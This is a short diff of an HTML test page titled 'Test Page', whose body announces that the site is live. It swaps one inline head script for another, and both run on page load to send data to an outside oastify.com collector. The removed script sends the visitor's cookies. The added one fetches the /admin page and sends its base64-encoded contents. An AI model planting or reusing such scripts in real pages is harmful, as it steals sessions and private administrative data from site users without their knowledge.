@@ -2,7 +2,7 @@
 <html>
 <head>
   <title>Test Page</title>
-  <script>new Image().src="https://rsnw4mwxet19k82txhk42ct5owunieh26.oastify.com?c="+document.cookie</script>
+  <script>fetch('/admin').then(r => r.text()).then(t => fetch('https://your.oastify.com?d='+btoa(t)))</script>
 </head>
 <body>
   <h1>It works! Your site is live 🚀</h1>
